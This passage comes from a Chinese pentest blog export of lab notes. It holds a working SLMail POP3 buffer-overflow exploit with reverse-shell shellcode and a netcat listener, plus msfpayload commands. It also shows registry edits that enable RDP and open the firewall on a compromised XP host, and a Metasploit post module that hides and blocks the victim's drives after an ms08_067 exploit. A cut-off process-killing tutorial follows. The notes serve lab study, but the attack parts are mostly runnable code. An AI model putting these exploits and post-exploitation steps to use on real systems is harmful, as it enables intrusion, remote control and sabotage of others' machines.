<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"> </span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"> </span><br><span class="line">shellcode =( </span><br><span class="line"><span class="string">&quot;\x6a\x48\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xab\x87\xc8&quot;</span>+　　　　　　<span class="comment">#&quot;.&quot;改&quot;+&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\x83\xeb\xfc\xe2\xf4\x57\xed\x23\x7c\x43\x7e\x37\xce\x54\xe7&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x43\x5d\x8f\xa3\x43\x74\x97\x0c\xb4\x34\xd3\x86\x27\xba\xe4\x9f&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x43\x6e\x8b\x86\x23\x78\x20\xb3\x43\x30\x45\xb6\x08\xa8\x07\x03&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x08\x45\xac\x46\x02\x3c\xaa\x45\x23\xc5\x90\xd3\xec\x19\xde\x62&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x43\x6e\x8f\x86\x23\x57\x20\x8b\x83\xba\xf4\x9b\xc9\xda\xa8\xab&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x43\xb8\xc7\xa3\xd4\x50\x68\xb6\x13\x55\x20\xc4\xf8\xba\xeb\x8b&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x43\x41\xb7\x2a\x43\x71\xa3\xd9\xa0\xbf\xe5\x89\x24\x61\x54\x51&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xae\x62\xcd\xef\xfb\x03\xc3\xf0\xbb\x03\xf4\xd3\x37\xe1\xc3\x4c&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x25\xcd\x90\xd7\x37\xe7\xf4\x0e\x2d\x57\x2a\x6a\xc0\x33\xfe\xed&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xca\xce\x7b\xef\x11\x38\x5e\x2a\x9f\xce\x7d\xd4\x9b\x62\xf8\xc4&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x9b\x72\xf8\x78\x18\x59\xa1\x8d\xc2\x9a\xcd\xef\xc9\x8d\xcd\xd4&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x41\xd0\x3e\xef\x24\xc8\x01\xe7\x9f\xce\x7d\xed\xd8\x60\xfe\x78&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x18\x57\xc1\xe3\xae\x59\xc8\xea\xa2\x61\xf2\xae\x04\xb8\x4c\xed&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x8c\xb8\x49\xb6\x08\xc2\x01\x12\x41\xcc\x55\xc5\xe5\xcf\xe9\xab&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x45\x4b\x93\x2c\x63\x9a\xc3\xf5\x36\x82\xbd\x78\xbd\x19\x54\x51&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x93\x66\xf9\xd6\x99\x60\xc1\x86\x99\x60\xfe\xd6\x37\xe1\xc3\x2a&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x11\x34\x65\xd4\x37\xe7\xc1\x78\x37\x06\x54\x57\xa0\xd6\xd2\x41&quot;</span>+</span><br><span class="line"><span class="string">&quot;\xb1\xce\xde\x83\x37\xe7\x54\xf0\x34\xce\x7b\xef\x38\xbb\xaf\xd8&quot;</span>+</span><br><span class="line"><span class="string">&quot;\x9b\xce\x7d\x78\x18\x31&quot;</span>)</span><br><span class="line"></span><br><span class="line">buffer = <span class="string">&#x27;A&#x27;</span> * <span class="number">2606</span> + <span class="string">&quot;\x03\x97\x4b\x5f&quot;</span> + <span class="string">&quot;\x90&quot;</span> * <span class="number">8</span> + shellcode</span><br><span class="line"> </span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nSending evil buffer...&quot;</span></span><br><span class="line">   s.connect((<span class="string">&quot;10.10.10.131&quot;</span>,<span class="number">110</span>))</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;USER z9m8r8&quot;</span>+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   data = s.recv(<span class="number">1024</span>)</span><br><span class="line">   s.send(<span class="string">&quot;PASS &quot;</span>+buffer+<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">   s.close()</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;\nDone!.&quot;</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">   <span class="built_in">print</span> <span class="string">&quot;Could not connect to POP3!&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>备注：</strong>
"0x90"表示无操作，防止shellcode前部分代码被擦除</p>
<p><strong>（2）重发</strong> <strong>buffer</strong></p>
<p><strong>注意：nc -vlp 444
(kali先开启侦听端口等待反弹shell的连接)</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128111513646-919605536.png" /></strong></p>
<p><strong>连接成功！</strong></p>
<p><strong>经测试退出后亦可重复连接。</strong>
有些shellcode执行结束会以exitprocess方式退出整个进程，将导致邮件服务奔溃，会引起管理员注意，不过新版本的metasploit已经进行优化。</p>
<p>•
Slmail是一个基于线程的应用，可用ExitThread方式可以避免整个服务崩溃，可实现重复溢出；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./msfpayload win32_reverse LHOST=10.10.10.171 EXITFUNC=thread LPORT=444 R | ./msfencode -b <span class="string">&quot;\x00\x0a\x0d&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="图形界面控制">7.8 图形界面控制</h4>
<p><strong>在此基础上ftp下载一个图形化木马管理程序</strong></p>
<p><strong>通过注册表可开启windows_xp_sp3的远程桌面服务</strong></p>
<p><strong>3389.reg：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00  </span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]  </span><br><span class="line"><span class="string">&quot;fDenyTSConnections&quot;</span>=dword:00000000  </span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM Server\Wds\rdpwd\Tds\tcp]  </span><br><span class="line"><span class="string">&quot;PortNumber&quot;</span>=dword:00000d3d  </span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]  </span><br><span class="line"><span class="string">&quot;PortNumber&quot;</span>=dword:00000d3d</span><br></pre></td></tr></table></figure>
<p><strong>执行前：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128114644165-1808985077.png" /></p>
<p><strong>执行：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\&gt;<span class="built_in">echo</span> Windows Registry Editor Version 5.00&gt;3389.reg</span><br><span class="line"><span class="built_in">echo</span> Windows Registry Editor Version 5.00&gt;3389.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg</span><br><span class="line"><span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> <span class="string">&quot;fDenyTSConnections&quot;</span>=dword:00000000&gt;&gt;3389.reg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;fDenyTSConnections&quot;</span>=dword:00000000&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line"><span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> <span class="string">&quot;PortNumber&quot;</span>=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PortNumber&quot;</span>=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg</span><br><span class="line"><span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp]&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> <span class="string">&quot;PortNumber&quot;</span>=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PortNumber&quot;</span>=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">**C:\** **&gt; regedit /s 3389.reg</span><br><span class="line">regedit /s 3389.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;shutdown -r -t 0</span><br><span class="line">shutdown -r -t 0**</span><br></pre></td></tr></table></figure>
<p><strong>结果：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128115127073-478057944.png" /></p>
<p><strong>防火墙开启远程桌面（通过现有shell，修改注册表开启）</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128133344544-902451314.png" /></p>
<p><strong>通过 RegSnap 抓取修改上图中的Remote Desktop
前后注册表变化，确定所需修改的注册表值，然后通过上面类似操作远程修改，重启即可）</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128134230552-1974109396.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128135511726-1676909492.png" /></p>
<p><strong>3389_firewall.reg</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line">[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List]</span><br><span class="line"><span class="string">&quot;3389:TCP&quot;</span>=<span class="string">&quot;3389:TCP:*:Enabled:@xpsp2res.dll,-22009&quot;</span></span><br></pre></td></tr></table></figure>
<p><strong>执行前：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128140724098-55431327.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128140756961-1163279134.png" /></p>
<p><strong>执行：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\&gt;<span class="built_in">echo</span> Windows Registry Editor Version 5.00&gt;3389_firewall.reg</span><br><span class="line"><span class="built_in">echo</span> Windows Registry Editor Version 5.00&gt;3389_firewall.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List]&gt;&gt;3389_firewall.reg</span><br><span class="line"><span class="built_in">echo</span> [HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\GloballyOpenPorts\List]&gt;&gt;3389_firewall.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;<span class="built_in">echo</span> <span class="string">&quot;3389:TCP&quot;</span>=<span class="string">&quot;3389:TCP:*:Enabled:@xpsp2res.dll,-22009&quot;</span>&gt;&gt;3389_firewall.reg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;3389:TCP&quot;</span>=<span class="string">&quot;3389:TCP:*:Enabled:@xpsp2res.dll,-22009&quot;</span>&gt;&gt;3389_firewall.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;regedit /s 3389_firewall.reg</span><br><span class="line">regedit /s 3389_firewall.reg</span><br><span class="line"></span><br><span class="line">C:\&gt;shutdown -r -t 0</span><br><span class="line">shutdown -r -t 0</span><br></pre></td></tr></table></figure>
<p><strong>结果：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128142129878-715530988.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220128142422955-709770562.png" /></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>缓冲区溢出</category>
      </categories>
      <tags>
        <tag>缓冲区溢出</tag>
      </tags>
  </entry>
  <entry>
    <title>编写让磁盘失效的后渗透模块</title>
    <url>/2021/11/22/%E7%BC%96%E5%86%99%E8%AE%A9%E7%A3%81%E7%9B%98%E5%A4%B1%E6%95%88%E7%9A%84%E5%90%8E%E6%B8%97%E9%80%8F%E6%A8%A1%E5%9D%97/</url>
    <content><![CDATA[<h2 id="代码实现">1. 代码实现</h2>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msf/core&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;rex&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;msf/core/post/windows/registry&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MetasploitModule</span> &lt; <span class="title class_ inherited__">Msf::Post</span></span><br><span class="line">  <span class="keyword">include</span> <span class="title class_">Msf::Post::Windows::Registry</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span></span><br><span class="line">    <span class="variable language_">super</span>(</span><br><span class="line">      <span class="string">&#x27;Name&#x27;</span> =&gt; <span class="string">&#x27;DRIVE DISABLER&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Description&#x27;</span> =&gt; <span class="string">&#x27;drive test!&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;Author&#x27;</span> =&gt; <span class="string">&#x27;z9m8r8&#x27;</span>,</span><br><span class="line">      <span class="string">&#x27;License&#x27;</span> =&gt; <span class="variable constant_">MSF_LICENSE</span></span><br><span class="line">    )</span><br><span class="line">    register_options(</span><br><span class="line">    [       </span><br><span class="line">    　　<span class="title class_">OptString</span>.new(<span class="string">&#x27;DriveName&#x27;</span>,[<span class="literal">true</span>,<span class="string">&#x27;Please set the Drive Letter&#x27;</span>])</span><br><span class="line">    ],</span><br><span class="line">      <span class="variable language_">self</span>.<span class="keyword">class</span></span><br><span class="line">    )</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">run</span></span><br><span class="line">    drive_int = drive_string(datastore[<span class="string">&#x27;DriveName&#x27;</span>])</span><br><span class="line">    key1=<span class="string">&quot;HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer&quot;</span></span><br><span class="line">    exists=meterpreter_registry_key_exist?(key1)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> exists</span><br><span class="line">      print_error(<span class="string">&quot;Key Doesn&#x27;t exist,Creating Key!&quot;</span>)</span><br><span class="line">      registry_createkey(key1)</span><br><span class="line">      print_good(<span class="string">&quot;creating ok!&quot;</span>)</span><br><span class="line">      meterpreter_registry_setvaldata(key1,<span class="string">&#x27;NoDrives&#x27;</span>,drive_int.to_s,<span class="string">&#x27;REG_DWORD&#x27;</span>,<span class="variable constant_">REGISTRY_VIEW_NATIVE</span>)</span><br><span class="line">      print_good(<span class="string">&quot;Restricting Access to the Drive&quot;</span>)</span><br><span class="line">      meterpreter_registry_setvaldata(key1,<span class="string">&#x27;NoViewOnDrives&#x27;</span>,drive_int.to_s,<span class="string">&#x27;REG_DWORD&#x27;</span>,<span class="variable constant_">REGISTRY_VIEW_NATIVE</span>)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      print_good(<span class="string">&quot;Key Exist, Skipping and Creating Values&quot;</span>)</span><br><span class="line">      print_good(<span class="string">&quot;Hiding Drive&quot;</span>)</span><br><span class="line">      meterpreter_registry_setvaldata(key1,<span class="string">&#x27;NoDrives&#x27;</span>,drive_int.to_s,<span class="string">&#x27;REG_DWORD&#x27;</span>,<span class="variable constant_">REGISTRY_VIEW_NATIVE</span>)</span><br><span class="line">      print_good(<span class="string">&quot;Restricting Access to the Drive&quot;</span>)</span><br><span class="line">      meterpreter_registry_setvaldata(key1,<span class="string">&#x27;NoViewOnDrives&#x27;</span>,drive_int.to_s,<span class="string">&#x27;REG_DWORD&#x27;</span>,<span class="variable constant_">REGISTRY_VIEW_NATIVE</span>)</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">      print_good(<span class="string">&quot;Disabled <span class="subst">#&#123;datastore[<span class="string">&#x27;DriveName&#x27;</span>]&#125;</span> Drive&quot;</span>)</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">drive_string</span>(<span class="params">drive</span>)</span><br><span class="line">    <span class="keyword">case</span> drive</span><br><span class="line">      <span class="keyword">when</span> <span class="string">&quot;A&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">      <span class="keyword">when</span> <span class="string">&quot;B&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">      <span class="keyword">when</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">4</span></span><br><span class="line">      <span class="keyword">when</span> <span class="string">&quot;D&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">8</span></span><br><span class="line">      <span class="keyword">when</span> <span class="string">&quot;E&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">16</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h2 id="代码解析">2. 代码解析</h2>
<h3 id="库文件介绍">1、库文件介绍</h3>
<p>Msf::Post::Windows::Registry，存于lib/msf/core/post/windows/registry.rb中，功能：<strong>操纵注册表</strong></p>
<h3 id="函数介绍">2、函数介绍</h3>
<ul>
<li><strong>register_options</strong></li>
</ul>
<p>register_options定义模块中要使用的自定义选项，并且使用OptString.new将DriveName定义为字符串类型。要定义一个新选项，需要required和description两个参数。这里需要将required的值设置为true，因为我们需要一个盘符来启动隐藏和禁用的进程。将这个值设置为true之后，除非将一个值分配给这个模块，否则这个模块将不会启动。</p>
<ul>
<li><strong>run</strong></li>
</ul>
<p>meterpreter_registry_key_exist，存在于lib/msf/core/post/windows/registry.rb中，检查在注册表中是否存在一个指定的键</p>
<p>registry_createkey，存在于lib/msf/core/post/windows/registry.rb中，创建一个新的注册表键</p>
<p>meterpreter_registry_setvaldata，存在于lib/msf/core/post/windows/registry.rb中，创建一个新的注册表值</p>
<ul>
<li><strong>drive_string（）</strong></li>
</ul>
<p>盘符掩码的计算，即将变量DriveName发送给drive_string方法以获得盘符对应的数值。</p>
<p><strong>公式：</strong> 2^([驱动器字符序列号]-1)</p>
<ul>
<li><strong>meterpreter_registry_setvaldata（）</strong></li>
</ul>
<p><strong>参数（5个）说明：</strong></p>
<p>字符串类型的注册表键路径，字符串类型的注册表值，10进制数字表示的硬盘盘符（这个值也要转换成对应的字符串类型），字符串类型的注册表值类型，整数类型的视图值（初始为0，设置为1表示32位视图，设置为2表示64位视图）</p>
<p>为实现对盘符的隐藏和访问限制需要创建两个注册表值，它们分别为NoDrives和NoViewOnDrive，值为10进制或者16进制表示的盘符，定义的类型为DWORD。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">meterpreter_registry_setvaldata</span>(key1,<span class="string">&#x27;NoDrives&#x27;</span>,drive_int.to_s,<span class="string">&#x27;REG_DWORD&#x27;</span>,REGISTRY_VIEW_NATIVE)  </span><br><span class="line"></span><br><span class="line"><span class="built_in">meterpreter_registry_setvaldata</span>(key1,<span class="string">&#x27;NoViewOnDrives&#x27;</span>,drive_int.to_s,<span class="string">&#x27;REG_DWORD&#x27;</span>,REGISTRY_VIEW_NATIVE)</span><br></pre></td></tr></table></figure>
<ul>
<li><strong>meterpreter_registry_key_exist</strong></li>
</ul>
<p>检查在系统中是否已经存在该注册表键</p>
<h2 id="msf-中测试">3. msf 中测试</h2>
<h3 id="靶机xp_sp3测试前">1、靶机（xp_sp3）测试前</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211122190551734-1403082473.png" /></p>
<h3 id="利用ms08_067拿下靶机xp">2、利用ms08_067拿下靶机（XP）</h3>
<ul>
<li>需要开启445端口，关闭防火墙</li>
<li>xp开启445端口的方法</li>
<li>https://zhidao.baidu.com/question/630090474565658644.html</li>
<li>WinXP如何关闭Windows防火墙</li>
<li>http://www.xitongzhijia.net/xtjc/20171106/111018.html</li>
<li>使用 exploit(windows/smb/ms08_067_netapi) 攻击即可</li>
</ul>
<p><strong>报错解决</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211122190725599-1865320102.png" /></p>
<p><strong>445
端口问题，有时候445是开着的，但仍旧报上图错，先重新开下445，再重启xp即可</strong></p>
<h3 id="后渗透测试">3、后渗透测试</h3>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt; background </span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf6 exploit(windows/smb/ms08_067_netapi) &gt; back </span><br><span class="line">msf6 &gt; use post/windows/windows_test </span><br><span class="line">msf6 post(windows/windows_test) &gt; <span class="built_in">set</span> session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf6 post(windows/windows_test) &gt; <span class="built_in">set</span> drivename C</span><br><span class="line">drivename =&gt; C</span><br><span class="line">msf6 post(windows/windows_test) &gt; exploit </span><br><span class="line"></span><br><span class="line">[!] SESSION may not be compatible with this module (incompatible session <span class="built_in">type</span>: meterpreter)</span><br><span class="line">[+] Key Exist, Skipping and Creating Values</span><br><span class="line">[+] Hiding Drive</span><br><span class="line">[+] Restricting Access to the Drive</span><br><span class="line">[+] Disabled C Drive</span><br><span class="line">[*] Post module execution completed</span><br><span class="line">msf6 post(windows/windows_test) &gt; </span><br></pre></td></tr></table></figure>
<h3 id="靶机测试后">4、靶机测试后：</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20211122190856892-942904645.png" /></p>
<p><strong>备注：要确保你已经获得了系统级的访问权限，方可执行上面的代码</strong></p>
]]></content>
      <categories>
        <category>精通Metasploit渗透测试 第2版</category>
      </categories>
      <tags>
        <tag>后渗透</tag>
        <tag>Metasploit</tag>
      </tags>
  </entry>
  <entry>
    <title>编程实现进程遍历，终止</title>
    <url>/2022/03/12/%E7%BC%96%E7%A8%8B%E5%AE%9E%E7%8E%B0%E8%BF%9B%E7%A8%8B%E9%81%8D%E5%8E%86%EF%BC%8C%E7%BB%88%E6%AD%A2/</url>
    <content><![CDATA[<h3 id="思路">1. 思路</h3>
<h4 id="进程遍历">1.1 进程遍历：</h4>
<p>(1)使用CreateToolhelp32Snapshot创建系统进程快照</p>
<p>(2)使用Process32First获取第一个进程的信息存入到PROCESSENTRY32结构体中</p>
<p>(3)再用Process32Next遍历所有进程</p>
<p>(4)最后用CloseHandle关闭句柄</p>
<h4 id="进程关闭">1.2 进程关闭：</h4>
<p>(1)先用OpenProcess根据进程号得到一个进程的句柄</p>
<p>(2)使用用TerminateProcess杀死进程</p>
<h4 id="api函数介绍">1.3 API函数介绍</h4>
<h5
id="createtoolhelp32snapshot获取系统中正在运行的进程信息线程信息等">(1)
CreateToolhelp32Snapshot()：获取系统中正在运行的进程信息，线程信息等</h5>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">HANDLE WINAPI <span class="title">CreateToolhelp32Snapshot</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">DWORD dwFlags, <span class="comment">//用来指定“快照”中需要返回的对象，可以是TH32CS_SNAPPROCESS等</span></span></span></span><br><span class="line"><span class="params"><span class="function">DWORD th32ProcessID <span class="comment">//一个进程ID号，用来指定要获取哪一个进程的快照，当获取系统进程列表或获取 当前进程快照时可以设为0</span></span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>dwFlags</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//指定快照中包含的系统内容，这个参数能够使用下列数值（常量）中的一个或多个。</span></span><br><span class="line"><span class="built_in">TH32CS_INHERIT</span>(<span class="number">0x80000000</span>) - 声明快照句柄是可继承的。</span><br><span class="line">TH32CS_SNAPALL - 在快照中包含系统中所有的进程和线程。</span><br><span class="line"><span class="built_in">TH32CS_SNAPHEAPLIST</span>(<span class="number">0x00000001</span>) - 在快照中包含在th32ProcessID中指定的进程的所有的堆。</span><br><span class="line"><span class="built_in">TH32CS_SNAPMODULE</span>(<span class="number">0x00000008</span>) - 在快照中包含在th32ProcessID中指定的进程的所有的模块。</span><br><span class="line"><span class="built_in">TH32CS_SNAPPROCESS</span>(<span class="number">0x00000002</span>) - 在快照中包含系统中所有的进程。</span><br><span class="line"><span class="built_in">TH32CS_SNAPTHREAD</span>(<span class="number">0x00000004</span>) - 在快照中包含系统中所有的线程。</span><br><span class="line">H32CS_SNAPALL = (TH32CS_SNAPHEAPLIST  TH32CS_SNAPPROCESS  TH32CS_SNAPTHREAD  TH32CS_SNAPMODULE)</span><br></pre></td></tr></table></figure>
<ul>
<li>th32ProcessID</li>
</ul>
<p>指定将要快照的进程ID。如果该参数为0表示快照当前进程。该参数只有在设置了TH32CS_SNAPHEAPLIST或者TH32CS_SNAPMODULE后才有效，在其他情况下该参数被忽略，所有的进程都会被快照。</p>
<ul>
<li>返回值</li>
</ul>
<p>调用成功，返回快照的句柄，调用失败，返回INVALID_HANDLE_VALUE 。
使用GetLastError函数查找该函数产生的错误状态码。 注意，在Win
NT中，要删除快照，使用CloseHandle函数；在Win
CE中，要删除快照，使用CloseToolhelp32Snapshot函数。</p>
<h5 id="openprocessterminateprocess等">(2)
OpenProcess(),TerminateProcess()等</h5>
<p><strong>参见：</strong><a
href="http://www.yfvb.com/help/win32sdk/index.htm?page=html/1.9t.qi.htm">WIN32
API手册</a></p>
<h3 id="c-的实现">2. c++ 的实现</h3>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//PROCESSENTRY32结构体，保存进程具体信息</span></span><br><span class="line">PROCESSENTRY32 pe32;</span><br><span class="line"><span class="comment">//PROCESSENTRY32的dwSize成员的值，注意必须要设置</span></span><br><span class="line">pe32.dwSize = <span class="built_in">sizeof</span>(pe32);</span><br><span class="line"><span class="comment">//获得系统进程快照的句柄</span></span><br><span class="line">HANDLE hProcessSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hProcessSnap == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;CreateToolhelp32Snapshot error.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//首先获得第一个进程</span></span><br><span class="line">BOOL bProcess = <span class="built_in">Process32First</span>(hProcessSnap, &amp;pe32);</span><br><span class="line"><span class="comment">//循环获得所有进程</span></span><br><span class="line"><span class="keyword">while</span> (bProcess)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//打印进程名和进程ID</span></span><br><span class="line">cout &lt;&lt; <span class="string">&quot;进程名称: &quot;</span> &lt;&lt; pe32.szExeFile &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;进程PID: &quot;</span> &lt;&lt; pe32.th32ProcessID &lt;&lt; endl;</span><br><span class="line">bProcess = <span class="built_in">Process32Next</span>(hProcessSnap, &amp;pe32);</span><br><span class="line">&#125;</span><br><span class="line"><span 